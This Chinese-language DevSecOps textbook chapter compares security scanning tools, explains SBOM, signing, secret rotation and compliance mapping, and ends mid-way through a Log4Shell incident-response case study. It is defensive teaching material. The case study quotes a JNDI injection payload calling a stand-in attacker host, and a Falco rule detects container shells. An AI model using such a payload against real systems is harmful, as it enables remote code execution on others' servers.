# 第10章：DevSecOps 安全左移

## 本章学习目标

- 理解 DevSecOps 的核心思想——"安全左移"
- 掌握 CI/CD 流水线中各阶段的安全扫描工具
- 了解供应链安全、密钥管理与合规审计
- 能够设计基础的安全流水线门禁

## 安全左移：为什么安全要"向左走"

### 传统安全模式的缺陷

传统模式下，安全是"最后一道关卡"——在应用即将上线前由安全团队做渗透测试。

```
需求 → 设计 → 开发 → 测试 → 部署 → 安全审计（发现漏洞 → 返工 → 延迟上线）
                                        ↑________  发现越晚，修复成本越高 _____↓
```

### 发现漏洞的时间成本

| 发现阶段 | 修复成本 | 相对成本 |
|---------|---------|---------|
| 编码时（IDE 提示） | 几分钟 | 1× |
| 提交时（Pre-commit / CI） | 几十分钟 | 10× |
| 测试时 | 几小时 | 100× |
| 上线后 | 数天 ~ 实锤 | 1000×+ |

> **安全左移（Shift Left）**：将安全活动尽可能向左（流程早期）移动，在编码和构建阶段就发现并修复安全问题。

## 安全流水线全景

```
代码提交 → 静态分析(SAST) → 依赖扫描(SCA) → 构建 → 镜像扫描 → 部署 → 动态扫描(DAST)
  │            │                │              │        │        │         │
  │   ESLint   │   Trivy       │              │   Trivy │        │  OWASP  │
  │   SonarQube│   Snyk        │              │   Grype │        │  ZAP    │
  │   Semgrep  │   OWASP DC    │              │   Clair  │        │  Nikto  │
  ▼            ▼                ▼              ▼        ▼        ▼         ▼
├──────────────┴────────────────┴──────────────┴────────┴────────┴─────────┤
│                        时间线（左 → 右）                                    │
└──────────────────────────────────────────────────────────────────────────┘
```

### 各阶段安全能力

| 阶段 | 检查内容 | 工具 | 阻断条件 |
|------|---------|------|---------|
| IDE / Pre-commit | 密钥泄露、代码规范 | GitLeaks, Pre-commit Hooks | 阻止提交 |
| CI - 静态分析 | 代码安全漏洞、逻辑缺陷 | SonarQube, Semgrep, CodeQL | 阻断流水线 |
| CI - 依赖扫描 | 开源组件 CVE、许可证 | Trivy, Snyk, OWASP DC | 高风险阻断 |
| CI - 构建 | 构建环境安全 | Docker Bench, CIS | 告警 |
| CI - 镜像扫描 | 镜像层 CVE、恶意软件 | Trivy, Grype, Harbor | 高危漏洞阻断 |
| CD - 动态扫描 | 运行时 API 安全 | OWASP ZAP, Burp Suite | 告警 |
| 部署后 | 合规审计、运行时监控 | Falco, OPA | 告警/阻断 |

## 关键安全实践详解

### SAST：静态应用安全测试

SAST 在**不运行代码**的情况下分析源码，发现安全漏洞。

```yaml
# GitHub CodeQL 示例
name: "CodeQL"
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  analyze:
    name: Analyze
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4
    - uses: github/codeql-action/init@v3
      with:
        languages: javascript
    - uses: github/codeql-action/analyze@v3
```

**SAST 可以发现**：
- SQL / NoSQL 注入
- XSS（跨站脚本攻击）
- 路径遍历
- 不安全的反序列化
- 硬编码凭证
- 竞态条件

### SAST 工具选型对比矩阵

SAST 工具选型需要在**覆盖度、精确度、性能、成本**之间权衡。以下是主流 SAST 工具的多维对比：

| 对比维度 | SonarQube (CE) | Semgrep | CodeQL | Fortify (商业) | Checkmarx (商业) |
|---------|---------------|---------|--------|---------------|-----------------|
| **开源/免费版** | 社区版免费，功能受限 | 社区版免费规则 | 公开仓库免费 | ❌ 纯商业 | ❌ 纯商业 |
| **语言支持** | 30+（Java/JS/TS/Python/Go/C#等） | 30+（社区规则覆盖广） | 12种（深度分析） | 28种 | 25+ |
| **分析精度** | 中等（基于AST+数据流受限） | 高（模式匹配+数据流） | 极高（全数据流分析） | 极高（多引擎） | 高（SQL注入/XSS精准） |
| **误报率** | 中等（~20-30%） | 低（~15%规则定制后可更低） | 低（~10-15%） | 低（~10%） | 中低（~15%） |
| **扫描速度** | 快（增量扫描支持） | 极快（秒级，适合Pre-commit） | 中等（编译分析较慢） | 慢（全量扫描） | 中等 |
| **CI 集成难度** | 低（GitHub/GitLab/Jenkins插件） | 极低（单二进制文件） | 低（GitHub Actions原生） | 中（需License Server） | 中（需管理端） |
| **许可成本** | 免费（CE）/ 按行数付费（DE/EE） | 免费开源 / Semgrep Pro $ | 免费（公开仓库）/ $ | $$$ （按开发者席位） | $$$ （按应用数） |
| **规则定制** | ✅ 自定义规则（需Java） | ✅ 自定义规则（YAML简洁） | ✅ QL查询语言（需学习） | ✅ 定制规则（Fortify SSC） | ✅ 定制查询 |
| **CI门禁集成** | Quality Gate | Exit Code | SARIF 输出 | Fortify SSC API | Checkmarx CLI |
| **典型部署** | 需自建Server或SonarCloud | 单二进制/CI插件 | Action/CLI | Server+Agent | Server+CLI |

**SAST 工具选型决策树**：

```
开始选型
├─ 预算有限 / 团队小 (<20人)
│  ├─ 需要深度分析 → CodeQL (GitHub仓库免费)
│  ├─ 追求速度+灵活规则 → Semgrep (免费社区版)
│  └─ 需要完整的质量管理 → SonarQube (自建社区版)
├─ 中型团队 (20-100人)
│  ├─ 已用GitHub → CodeQL + SonarCloud
│  ├─ 多语言+快节奏 → Semgrep Pro + SonarQube
│  └─ 合规审计需求强 → Checkmarx
└─ 大型企业 / 合规敏感行业
   ├─ 金融/医疗 → Fortify (OWASP Top 10 + PCI-DSS覆盖完整)
   ├─ 严格审计追踪 → Checkmarx (报告最详尽)
   └─ 混合方案 → CodeQL (深度) + Semgrep (快速扫描)
```

**成本-收益权衡总结**：

| 团队规模 | 推荐组合 | 年成本估算 | 覆盖度 | 综合推荐 |
|---------|---------|-----------|-------|---------|
| 初创<10人 | Semgrep + SonarQube | $0 | 80% | ⭐⭐⭐⭐⭐ |
| 成长型50人 | CodeQL + Semgrep Pro | $0~$15K | 90% | ⭐⭐⭐⭐⭐ |
| 中型企业200人 | Semgrep Pro + Fortify | $50K~$200K | 95% | ⭐⭐⭐⭐ |
| 大型企业1000+ | Fortify/Checkmarx + CodeQL | $200K+ | 98% | ⭐⭐⭐⭐ |

> **实际建议**：不要只依赖一个 SAST 工具。推荐"1 主力 + 1 辅助"策略：主力做深度分析（CodeQL/Fortify），辅助做快速反馈（Semgrep 直接集成在 Pre-commit）。

### SCA：软件组成分析

现代应用 80%+ 的代码来自开源库。SCA 扫描这些依赖中的已知漏洞（CVE）。

```bash
# Trivy SCA 扫描项目依赖
trivy fs . --scanners vuln,secret
```

```yaml
# 流水线中的 SCA
steps:
  - name: Dependency Scan
    run: |
      trivy fs --severity HIGH,CRITICAL --exit-code 1 ./path/to/project
      # exit-code 1 表示发现漏洞，阻止 CI 通过
```

**许可证合规**：除了 CVE，还需检查开源许可证是否冲突（GPL vs Apache vs MIT）。

### SCA 工具选型对比矩阵

| 对比维度 | Trivy | Snyk | OWASP Dependency-Check | BlackDuck (商业) |
|---------|-------|------|----------------------|-----------------|
| **开源/免费版** | ✅ 完全开源免费 | 免费版有限制（200次/月） | ✅ 完全开源免费 | ❌ 纯商业 |
| **漏洞库更新速度** | 快（每日更新，NVD/GHSA/RedHat多源） | 极快（自研漏洞库，CVE发布数小时内） | 较慢（NVD更新有滞后） | 快（商业级漏洞研究团队） |
| **许可证检测** | ✅ 基础支持 | ✅ 详细检测+冲突分析 | ✅ 基础支持 | ✅ 企业级 |
| **容器扫描** | ✅ 原生支持（O/S包+应用依赖） | ✅ 容器+K8s集成 | ❌ 不支持 | ✅ 支持 |
| **IaC 扫描** | ✅ 支持（K8s/Terraform/CloudFormation） | ✅ 支持 | ❌ 不支持 | ✅ 支持 |
| **SBOM 生成** | ✅ CycloneDX/SPDX 输出 | ✅ CycloneDX 输出 | ❌ | ✅ CycloneDX/SPDX |
| **CI 集成** | 极简（单二进制/容器） | 良好（丰富插件） | Maven/Gradle/GitHub插件 | Jenkins/插件 |
| **Fix 建议** | ❌ 仅报告 | ✅ 直接提供修复版本和PR | ❌ 仅报告 | ✅ 提供修复建议 |
| **许可模式** | Apache 2.0 开源 | Freemium | Apache 2.0 开源 | 商业年订阅 |
| **年费用估算** | $0 | $0~$40K/年（Team计划起） | $0 | $50K~$200K+ |
| **扫描速度** | 快（缓存层加速） | 中等（需上传到Snyk平台） | 中等（下载CVE库慢） | 中等 |

**SCA 工具选型决策**：

```
按场景选择 SCA 工具：
├─ 需要容器扫描+开放 → Trivy (No.1 选择，完全免费多功能)
├─ 需要漏洞修复建议 → Snyk (Fix PR 自动生成，团队协作好)
├─ 合规审计/安全报告 → BlackDuck (企业级审计报告)
├─ Java/Maven 项目简单CVE检测 → OWASP DC
└─ 推荐组合：Trivy(快速CI扫描) + Snyk(深度修复)
```

### 镜像安全

```bash
# Trivy 扫描容器镜像
trivy image my-app:latest

# 输出示例
Total: 3 (HIGH: 2, CRITICAL: 1)

┌──────────────┬──────────────┬──────────┬────────────────┐
│   Library    │ Vulnerability │ Severity │ InstalledVersion│
├──────────────┼──────────────┼──────────┼────────────────┤
│ libopenssl1  │ CVE-2024-xxx │ CRITICAL │ 1.1.1t         │
│ libcurl4     │ CVE-2024-yyy │ HIGH     │ 7.88.1         │
└──────────────┴──────────────┴──────────┴────────────────┘
```

**不可变镜像安全基线**：
1. 基础镜像 → 使用官方或自建安全基线镜像
2. 构建阶段 → 移除不必要的工具和调试信息
3. 运行时 → 非 root 用户运行
4. 只读根文件系统（readOnlyRootFilesystem: true）

### 供应链安全深度分析

#### SLSA 框架：供应链安全可信度分级

SLSA（Supply-chain Levels for Software Artifacts）是一个端到端的供应链安全框架，定义了从 L1 到 L4 四个级别的可信度：

| 级别 | 要求 | 关键实践 | 实现方式 |
|------|------|---------|---------|
| **L1** | 构建过程可追溯 | 有构建脚本，产物与源码关联 | CI/CD 流水线产出的产物元数据 |
| **L2** | 构建过程防篡改 | 使用版本控制系统 + 签名 | 构建服务器生成签名（GPG/Sigstore） |
| **L3** | 构建平台额外防护 | 抗篡改的构建平台+防伪元数据 | 隔离构建环境 + 非临时构建主机 |
| **L4** | 完整的两阶段审查 | 双人评审的构建过程 + 全部依赖链验证 | 可复现构建 + 依赖完整验证 |

**SLSA 实施路径**：
```bash
# L1 起点：所有构建都通过 CI 执行
# L2 目标：为每个构建产物签名
cosign sign --key cosign.key my-app:v1.0.0

# L3 目标：使用隔离的构建环境
# 在 GitHub Actions 中使用 OIDC
- name: Generate SLSA provenance
  uses: slsa-framework/slsa-github-generator@v2.0.0

# L4 目标：可复现构建 + 依赖完整验证
# 使用 hermetic 构建模式
# 所有依赖锁文件版本并验证 checksum
```

#### SBOM：软件物料清单

SBOM（Software Bill of Materials）是供应链安全的基础——记录软件中所有组件的清单。

**生成工具对比：CycloneDX vs SPDX**

| 对比维度 | CycloneDX | SPDX |
|---------|-----------|------|
| **格式标准** | OWASP 维护的标准 | SPDX 工作组（Linux基金会） |
| **规范版本** | v1.5 (2023) | v2.3 (2022)，v3.0 (2023) |
| **核心定位** | 应用安全（漏洞关联） | 许可证合规（法律层面） |
| **漏洞关联** | ✅ 内置 vulnerability 字段 | ❌ 需扩展（v3.0 才支持） |
| **度量信息** | ✅ 支持组件哈希、依赖图 | ✅ 支持，但侧重文件级 |
| **工具生态** | CycloneDX Maven Plugin / Syft / Trivy | SPDX Tools / ORT |
| **CI 集成** | 易（生成+验证 CLI 丰富） | 中（工具链稍复杂） |
| **典型场景** | DevSecOps 流水线中的漏洞管理 | 合规审计、法律审查 |

**SBOM 生成与 CI 集成**：
```yaml
# 在 CI 流水线中生成 SBOM
steps:
  - name: Generate SBOM with Syft
    run: |
      syft packages my-app:latest -o cyclonedx-json > sbom.cyclonedx.json

  - name: Upload SBOM to Dependency Track
    run: |
      curl -X POST "https://dtrack.example.com/api/v1/bom" \
        -H "X-API-Key: ${{ secrets.DTRACK_API_KEY }}" \
        -H "Content-Type: multipart/form-data" \
        -F "project=my-app" \
        -F "bom=@sbom.cyclonedx.json"

  - name: Verify SBOM with Trivy
    run: |
      trivy sbom sbom.cyclonedx.json --severity CRITICAL --exit-code 1
```

**SBOM 文件示例**（CycloneDX JSON）：
```json
{
  "bomFormat": "CycloneDX",
  "specVersion": "1.5",
  "metadata": {
    "component": {
      "name": "my-app",
      "version": "1.0.0",
      "type": "application"
    }
  },
  "components": [
    {
      "name": "log4j-core",
      "version": "2.17.1",
      "type": "library",
      "purl": "pkg:maven/org.apache.logging.log4j/log4j-core@2.17.1",
      "licenses": [{"license": {"id": "Apache-2.0"}}]
    }
  ]
}
```

#### 镜像签名与验证：Cosign + Notary + Sigstore

| 技术 | 说明 | 适用场景 |
|------|------|---------|
| **Cosign** | Sigstore 项目的容器签名工具，支持密钥+OIDC | 现代容器签名首选 |
| **Notary** | Docker 原生签名（TUF框架），陈旧但兼容 | 遗留 Docker Content Trust |
| **Sigstore** | 无密钥签名基础设施（Fulcio + Rekor） | 最简签名的未来方向 |

**Cosign 签名与验证工作流**：

```bash
# 使用密钥对签名（传统方式）
cosign generate-key-pair
cosign sign --key cosign.key registry.example.com/my-app:v1.0.0

# 使用 Sigstore OIDC 无密钥签名（推荐）
cosign sign registry.example.com/my-app:v1.0.0

# 在部署时验证签名
cosign verify --key cosign.pub registry.example.com/my-app:v1.0.0

# 在 Harbor/Trivy 中集成验证（自动阻断未签名的镜像）
trivy image --scanners vuln --cosign-key cosign.pub registry.example.com/my-app:latest
```

**Harbor 镜像签名策略配置**：
```yaml
# Harbor 配置：只允许签名的镜像部署
harbor:
  signature:
    enabled: true
    verification:
      cosign:
        public_key: /etc/harbor/cosign.pub
  retention:
    policies:
      - name: block-unsigned
        action: block
        resource: artifact
        rule: |
          artifact.type == "IMAGE" &&
          artifact.signatures.length == 0
```

### DAST：动态应用安全测试

DAST 在**运行时**对应用进行攻击测试。

```bash
# OWASP ZAP 快速扫描
docker run -v $(pwd):/zap/wrk/:rw -t ghcr.io/zaproxy/zaproxy \
  zap-api-scan.py -t https://target.com/api -f openapi
```

**DAST 可以发现**：
- 运行时暴露的端点
- CSRF 漏洞
- 认证绕过
- 限流不足
- 敏感信息泄露（响应中暴露堆栈跟踪等）

### DAST 工具选型对比矩阵

| 对比维度 | OWASP ZAP | Burp Suite Pro | Acunetix (商业) |
|---------|-----------|---------------|-----------------|
| **许可模式** | ✅ 完全开源免费 | Freemium（社区版免费，Pro $） | ❌ 纯商业 |
| **自动化扫描** | ✅ 命令行/API 驱动 | ✅ 需扩展（Pro版有扫描器） | ✅ 全自动+定时扫描 |
| **API 扫描** | ✅ OpenAPI/GraphQL/SOAP | ✅ 需手动配置 | ✅ REST/SOAP/GraphQL |
| **认证测试** | ✅ 表单认证/Selenium脚本 | ✅ 集成浏览器 | ✅ 自动发现认证页面 |
| **漏洞库覆盖** | OWASP Top 10 全覆盖 | OWASP Top 10 + 商业增强 | 6000+ 漏洞检测 |
| **误报率** | 较高（需人工确认） | 中等 | 低（商业级引擎） |
| **扫描速度** | 中等（ZAP引擎） | 慢（主动扫描较慢） | 快（多线程并行） |
| **CI 集成** | 易（Docker CLI 模式） | 中（需 Pro 许可 + REST API） | 易（Jenkins/Azure DevOps插件） |
| **报告质量** | 基础HTML/Markdown | 详细（支持自定义模板） | 企业级（合规报告） |
| **年费用** | $0 | $449/年（Pro） | $$$ （按域名/资产数） |

**DAST 选型场景**：
```
├─ 初创团队/开源项目 → OWASP ZAP（功能已经足够，社区活跃）
├─ 专业安全团队渗透测试 → Burp Suite Pro（手动+自动结合）
├─ 企业自动化安全审计 → Acunetix（低误报+合规报告）
└─ 推荐组合：ZAP(日常CI扫描) + Burp Pro(季度深度渗透)
```

**完整安全工具决策框架**：

```
项目类型 → 安全需求 → 工具组合
├─ Web应用（10人以下团队）
│  ├─ SAST: Semgrep (pre-commit) + CodeQL (CI)
│  ├─ SCA: Trivy (CI)
│  ├─ DAST: ZAP (每周定时扫描)
│  └─ 总成本: $0
├─ 微服务架构（50人团队）
│  ├─ SAST: Semgrep + SonarQube
│  ├─ SCA: Trivy + Snyk
│  ├─ 镜像扫描: Trivy in Harbor
│  ├─ DAST: ZAP API scan (CD流水线)
│  └─ 总成本: $0~$15K/年
├─ 金融/合规要求（200人+）
│  ├─ SAST: Checkmarx/Fortify + CodeQL
│  ├─ SCA: BlackDuck + Trivy
│  ├─ DAST: Acunetix + Burp Pro
│  └─ 总成本: $200K+/年
└─ 云原生/SaaS（任何规模）
   └─ 必须包含: 镜像扫描(Harbor/Trivy) + 供应链SBOM + 运行时Falco
```

## 密钥管理

### 常见错误

```
# ❌ 大忌！密钥硬编码
DB_PASSWORD = "SuperSecret123!"
aws_access_key_id = "AKIAIOSFODNN7EXAMPLE"

# ❌ 提交到 Git 仓库
git add . && git commit -m "add config"  # .env 也在里面！
```

### 安全密钥管理方案

| 方案 | 说明 | 适用场景 |
|------|------|---------|
| **环境变量** | 运行时注入 | 最基础，配合 Secret 管理 |
| **K8s Secret** | Base64 但建议加密 | K8s 原生 |
| **Vault (HashiCorp)** | 动态密钥、租约、审计 | 企业级 |
| **Secrets Manager** | AWS Secrets Manager / GCP Secret Manager | 云原生 |
| **SOPS** | 加密后提交 Git | GitOps 场景 |

### K8s 中的密钥管理最佳实践

```yaml
# ✅ 使用 External Secrets Operator 从 Vault/AWS 同步到 K8s Secret
apiVersion: external-secrets.io/v1beta1
kind: ExternalSecret
metadata:
  name: db-credentials
spec:
  secretStoreRef:
    name: vault-backend
  target:
    name: db-secret
  data:
  - secretKey: password
    remoteRef:
      key: secret/data/db
      property: password
```

### 密钥轮换策略

密钥轮换是防止密钥泄漏后长期可用和满足合规要求的核心实践。轮换策略的选择直接影响系统的可用性和运维成本。

#### 自动轮换 vs 手动轮换

| 对比维度 | 自动轮换 | 手动轮换 |
|---------|---------|---------|
| **频率** | 可按计划（30/60/90天）自动执行 | 人工触发，通常随审计周期 |
| **人力和用** | 低（全自动化） | 高（需运维人员操作） |
| **响应泄漏** | 即时轮换（检测到泄漏自动触发） | 延迟较大（人工介入） |
| **运维风险** | 需完善的自动化测试 | 轮换过程容易遗漏依赖方 |
| **审计合规** | ✅ 有轮换记录可追溯 | ❌ 容易疏于执行 |
| **推荐场景** | 生产环境所有密钥 | 非关键测试密钥、初始配置 |
| **实现工具** | Vault Dynamic Secrets / AWS Secrets Manager 自动轮换 | 定期手动更新 / 脚本辅助 |

**自动轮换实现示例（Vault Dynamic Secrets）**：

```bash
# Vault 配置数据库动态凭据 - 每次请求获得临时凭证
vault write database/config/postgres \
    plugin_name=postgresql-database-plugin \
    allowed_roles="app-role" \
    connection_url="postgresql://{{username}}:{{password}}@localhost:5432/mydb"

vault write database/roles/app-role \
    db_name=postgres \
    creation_statements="CREATE USER \"{{name}}\" WITH PASSWORD '{{password}}' VALID UNTIL '{{expiration}}';" \
    default_ttl="1h" \
    max_ttl="24h"
```

**AWS Secrets Manager 自动轮换配置**：

```yaml
# 使用 CloudFormation 配置 RDS 凭据自动轮换
MySecret:
  Type: AWS::SecretsManager::Secret
  Properties:
    Name: db-credentials
    Description: RDS 数据库凭据，每30天自动轮换
    GenerateSecretString:
      SecretStringTemplate: '{"username": "admin"}'
      GenerateStringKey: "password"
      PasswordLength: 32
      ExcludeCharacters: '"@/\'
    RotationRules:
      AutomaticallyAfterDays: 30
      Duration: 1h
    RotationLambdaARN: !GetAtt RotationLambda.Arn
```

#### 零停机密钥轮换方案

密钥轮换最大的挑战是：**轮换过程中如何保证服务不中断？**

**方案一：蓝绿密钥（双密钥并行）**

```
轮换过程：
1. 生成新密钥 K2 (保留旧密钥 K1)
2. 应用代码更新为："先尝试 K2 解密，失败则回退 K1"
3. 等待所有服务实例都使用 K2 后
4. 废弃 K1
```

```yaml
# 蓝绿密钥示例：KMS 多密钥支持
encryption:
  primary_key_id: alias/my-key-v2    # 新密钥，用于加密新数据
  secondary_key_id: alias/my-key-v1  # 旧密钥，仅用于解密存量数据
  rotation_mode: dual-read-write    # 双读双写模式
```

**方案二：双读双写（适用于数据库凭据）**

```
时间线：
T0:   使用 Credential Set A → 开始同时写入 Set B（保留 A 的读写能力）
T1:   所有服务已更新 B → 切换完全使用 Set B
T2:   确认 B 正常工作 → 撤销 Set A
T3:   下次轮换开始...循环 A/B
```

```go
// 双读双写模式 Go 伪代码
type DualCredentialManager struct {
    primary   Credential   // 当前使用
    secondary Credential   // 轮换目标（新）
    inRotation bool
}

func (m *DualCredentialManager) GetConnString() string {
    // 轮换期间：尝试新凭据，失败回退旧凭据
    if m.inRotation {
        db, err := sql.Open("postgres", m.secondary.DSN())
        if err == nil && db.Ping() == nil {
            log.Info("Rotation: switched to new credentials")
            m.inRotation = false
            m.primary = m.secondary
            return m.secondary.DSN()
        }
        log.Warn("Rotation: fallback to primary credentials")
        return m.primary.DSN()
    }
    return m.primary.DSN()
}
```

**方案三：通过 Sidecar 代理凭据刷新**

```yaml
# 使用 Vault Agent Sidecar 自动处理密钥轮换
apiVersion: apps/v1
kind: Deployment
metadata:
  name: my-app
spec:
  template:
    spec:
      containers:
      - name: my-app
        image: my-app:latest
        env:
        - name: DB_PASSWORD
          valueFrom:
            secretKeyRef:
              name: vault-secret   # Vault Agent 写入的 Secret
              key: password
      - name: vault-agent
        image: hashicorp/vault:1.16.0
        args:
        - agent
        - -config=/etc/vault/config.hcl
```

> **生产建议**：对数据库凭据使用 Vault Dynamic Secrets（每次请求获得临时凭证），对 API Key 使用 Secrets Manager 自动轮换（30天周期+双读双写），对 TLS 证书使用 cert-manager（自动续签+ACME/DNS-01 验证）。

## 运行时安全

### Falco：容器运行时安全

Falco 是 CNCF 的运行时安全工具，监控容器异常行为：

```yaml
# Falco 规则示例：检测 Shell 进入容器
- rule: Terminal Shell in Container
  desc: A shell was used as the entrypoint/exec point
  condition: >
    spawned_process and container
    and proc.name in (bash, zsh, sh)
  output: >
    Shell spawned in container (user=%user.name %container.info)
  priority: WARNING
```

**Falco 能检测**：
- 容器内执行 Shell
- 敏感文件访问
- 预期外的网络连接
- 提权行为

## 零信任原则

> **永不信任，始终验证。**—— 零信任模型（Zero Trust）

| 原则 | 实践 |
|------|------|
| 永远验证身份 | 每次请求都需要认证，不论来源 |
| 最小权限 | 只给完成任务的最小权限 |
| 假设已被攻破 | 内网流量也要加密（mTLS）|
| 持续验证 | 不只是登录时验证，运行中也持续校验 |

**K8s 中的零信任实践**：
- NetworkPolicy：默认拒绝所有入站流量，只放行必要路径
- Pod Security Standards：限制 Pod 的权限（Root、特权模式）
- Service Mesh mTLS：服务间所有通信加密
- RBAC：ServiceAccount 最小权限

## 合规框架映射

合规不是可选项——对受监管行业（金融、医疗、电商），合规是准入门槛。以下是常见安全标准及其对应的 DevSecOps 实践映射。

### 常见安全标准与要求概述

| 标准 | 适用范围 | 核心要求 | 典型审计频率 |
|------|---------|---------|-------------|
| **PCI-DSS** | 处理信用卡支付的所有组织 | 保护持卡人数据，网络分段，访问控制 | 年度（SAQ/QSA）+ 季度ASV扫描 |
| **SOC2** | SaaS/云服务提供商 | 安全、可用性、处理完整性、保密性、隐私 | 年度 |
| **ISO 27001** | 全球通用信息安全管理 | ISMS（信息安全管理体系），持续改进 | 3年认证+年度监督 |
| **GDPR** | 处理欧盟公民个人数据 | 数据保护、同意管理、泄露通知（72h内） | 持续合规+定期自评估 |

### 安全控制与工具映射矩阵

| 安全控制 | PCI-DSS | SOC2 | ISO 27001 | 对应工具/实践 |
|---------|---------|------|-----------|-------------|
| **Web 应用防火墙** | 6.6（面向公众的Web应用需WAF） | CC6.6 | A.14.2.1 | ModSecurity / Cloudflare WAF / AWS WAF |
| **代码安全审查** | 6.3（应用开发需基于安全编码） | CC6.1 | A.14.2.5 | CodeQL / Semgrep / SonarQube |
| **漏洞扫描** | 11.2（内外网定期间隔扫描） | CC6.2 | A.12.6.1 | Trivy / Nessus / OpenVAS |
| **渗透测试** | 11.3（年度渗透测试 + 重大变更后） | CC6.2 | A.14.2.8 | Burp Suite / Acunetix / 外部测试 |
| **访问控制** | 7.1~7.3（最小权限+唯一ID） | CC6.3 | A.9.2.1~9.2.6 | RBAC / OPA / K8s RBAC |
| **日志审计** | 10.2~10.7（审计日志保留至少1年） | CC6.8 | A.12.4.1~12.4.3 | ELK / Grafana Loki / Falco |
| **加密传输** | 4.1（持卡人数据加密传输） | CC6.7 | A.13.2.1 | mTLS / TLS 1.2+ / cert-manager |
| **密钥管理** | 3.5~3.6（加密密钥管理） | CC6.7 | A.10.1 | Vault / AWS KMS / SealedSecrets |
| **变更管理** | 6.4（生产变更需审批） | CC6.1 | A.12.1.2 | GitOps PR流程 / CI/CD门禁 |
| **容器安全** | 2.2.1（组件安全配置） | CC6.2 | A.12.6.2 | Docker Bench / Trivy / K8s PSS |
| **数据保护** | 3.4（持卡人数据脱敏/掩码） | CC6.7 | A.8.2.1 | 数据脱敏网关 / 列级加密 |
| **漏洞管理** | 6.1~6.2（维护安全策略+补丁管理） | CC6.2 | A.12.6.1 | 自动补丁流水线 / Vulnerability Dashboard |

**具体合规场景示例**：

```
PCI-DSS 6.6 要求：面向公众的 Web 应用必须配置 WAF 并定期审查
├─ 最佳实践：使用 Cloudflare WAF 或 AWS WAF 规则集
├─ 自动化验证：在 CI 中检查所有 Ingress 资源是否关联了 WAF
└─ 审计证据：WAF 日志保留至少 1 年 + 季度规则审查记录

SOC2 CC6.1 要求：软件开发和变更需经过测试、审查和批准
├─ 最佳实践：Git 分支保护 + 强制 Code Review + PR 模板
├─ 自动化验证：CI 流水线中的 SAST + SCA + 镜像扫描门禁
└─ 审计证据：Git 提交历史和 PR 记录回溯
```

**GDPR 数据泄露通知要求（Article 33）**：

```
时间线：在发现数据泄露后 72 小时内通知监管机构
├─ 自动化能力：
│   ├─ Falco 实时告警配置
│   ├─ 自动触发 Incident Response 流程
│   └─ 邮件/PagerDuty/Slack 多通道通知
├─ 审计证据保留：
│   ├─ 日志保留策略至少 90 天
│   ├─ 泄露事件记录模板
│   └─ 自动生成初始通知报告
└─ 实施建议：建立实际演练（每季度至少一次模拟泄露场景）
```

**合规工具集成流水线示例**：

```yaml
# 在流水线中嵌入合规检查
compliance-check:
  stage: compliance
  script:
# 检查是否配置了 WAF（PCI-DSS 6.6）
    - kubectl get ingress -A -o json | jq '.items[].metadata.annotations | has("nginx.ingress.kubernetes.io/enable-modsecurity")'
# 检查 TLS 版本（PCI-DSS 4.1）
    - kubectl get ingress -A -o json | jq '.items[].spec.tls[].hosts'
# 检查日志保留配置（PCI-DSS 10.7）
    - kubectl get configmap logging-config -n logging -o json | jq '.data' | grep "retention"
# 生成合规报告
    - compliance-checker generate-report --standards pci-dss,soc2 > compliance-report.html
```

> **合规不是一次性工作**，而是持续工程。建议在 CI 中嵌入自动化合规检查作为"合规即代码"实践，定期生成合规报告以满足审计要求。

## 安全流水线设计要点

```yaml
# 安全门禁设计：三种严重级别
security-gates:
  CRITICAL:
    action: block-pipeline      # 直接阻断，立即修复
    tools: [trivy, codeql]
    slo: 0 violations

  HIGH:
    action: block-pipeline      # 阻断，但有例外审批机制
    tools: [trivy, sonarqube]
    slo: fix within 48h

  MEDIUM:
    action: warn-only           # 仅告警，不阻断
    tools: [eslint, snyk]
    slo: fix within 1 week

  LOW / INFO:
    action: log-only            # 仅记录，月度回顾
    tools: [all]
    slo: review monthly
```

## 生产案例：某电商平台应对 Log4Shell 漏洞的应急响应

### 背景

2021年12月9日，Apache Log4j 2 核心组件被曝出严重远程代码执行漏洞 **CVE-2021-44228（Log4Shell）**，CVSS 评分 10.0（最高严重级别）。该漏洞影响 Log4j 2.x 全系列版本（2.0~2.14.1），利用链极其简单——在日志消息中插入 `${jndi:ldap://attacker.com/a}` 即可触发 JNDI 注入，导致远程代码执行。

### 业务环境

某头部电商平台，日活用户 3000 万，日均订单量 200 万+。系统采用微服务架构，共有 **200+ 独立微服务**，运行在 8 个 K8s 集群（生产、预发布、测试各 2 个，灾备 2 个）。

### 痛点与挑战

| 挑战 | 具体描述 |
|------|---------|
| **依赖面广** | 几乎所有 Java 服务都依赖 Log4j（Spring Boot/Spring Cloud 内置），200+ 微服务中约 180 个使用了 Log4j |
| **版本杂乱** | Log4j 版本从 2.0 到 2.14.1 不等，部分服务使用 SLF4J + Logback 也需要交叉检查 |
| **无 SBOM** | 此前没有系统生成和维护 SBOM，无法快速定位受影响组件的精确版本 |
| **第三方依赖** | 部分团队直接依赖第三方库（如 Elasticsearch 客户端、Kafka 客户端），这些库内部也捆绑 Log4j |
| **业务连续性** | 平台 7×24 运行，凌晨有大促流量，不能直接停机排查 |

### 应急响应实施过程

#### 阶段一：快速排查（T+0 ~ T+2h）

```bash
# Step 1: 全集群扫描，使用 Trivy 扫描所有运行中的镜像
trivy image --severity CRITICAL --list-all-pkgs registry.k8s.io/order-service:v2.3.1

# Step 2: 批量扫描所有镜像仓库
# 使用 Harbor 的批量扫描功能触发全量镜像扫描
curl -X POST "https://harbor.internal/api/v2.0/projects/library/repositories/artifacts/scan" \
  -H "Authorization: Bearer $TOKEN"

# Step 3: 生成 SBOM 并导入 Dependency-Track 进行集中分析
syft packages registry.k8s.io/order-service:v2.3.1 -o cyclonedx-json > order-service-sbom.json
curl -X POST "https://dtrack.internal/api/v1/bom" \
  -H "X-API-Key: $DTRACK_KEY" \
  -F "project=order-service" \
  -F "bom=@order-service-sbom.json"
```

**排查结果**：

| 受影响级别 | 服务数量 | 说明 |
|-----------|---------|------|
| **Critical**（Log4j 2.0~2.14.1 直接依赖） | 120 个 | 直接使用 Log4j-core，JVN 注入可用 |
| **High**（间接依赖，含 Log4j 的第三方库） | 45 个 | 通过 Elasticsearch/Kafka 等间接使用 |
| **Medium**（Logback + log4j-over-slf4j 桥接） | 15 个 | 风险较低但仍需升级 |
| **未受影响**（非 Java 服务） | 20 个 | Go/Python/Node 服务 |

#### 阶段二：分级修补（T+2h ~ T+24h）

```yaml
# 修补优先级策略
remediation:
  critical:
    - services: [order-service, payment-service, user-service, inventory-service]
    - count: 20 (核心交易链路)
    - deadline: 4 hours
